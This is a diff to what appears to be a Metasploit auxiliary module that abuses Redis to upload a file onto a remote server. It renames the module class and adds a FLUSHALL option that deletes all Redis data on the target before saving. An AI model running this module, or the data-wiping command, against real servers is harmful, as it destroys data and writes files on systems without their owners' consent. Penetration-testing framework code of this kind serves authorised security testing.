@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Redis
 
   def initialize(info = {})
@@ -40,7 +40,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
         OptString.new('RemoteFile', [false, 'Remote file path']),
-        OptBool.new('DISABLE_RDBCOMPRESSION', [true, 'Disable compression when saving if found to be enabled', true])
+        OptBool.new('DISABLE_RDBCOMPRESSION', [true, 'Disable compression when saving if found to be enabled', true]),
+        OptBool.new('FLUSHALL', [true, 'Run flushall to remove all redis data before saving', false])
       ]
     )
   end
@@ -80,6 +81,13 @@ class Metasploit3 < Msf::Auxiliary
       else
         print_error("#{peer} -- Unable to disable rdbcompresssion")
         reset_rdbcompression = false
+      end
+    end
+
+    if datastore['FLUSHALL']
+      data = redis_command('FLUSHALL')
+      unless data.include?('+OK')
+        print_warning("#{peer} -- failed to flushall(); continuing")
       end
     end
 
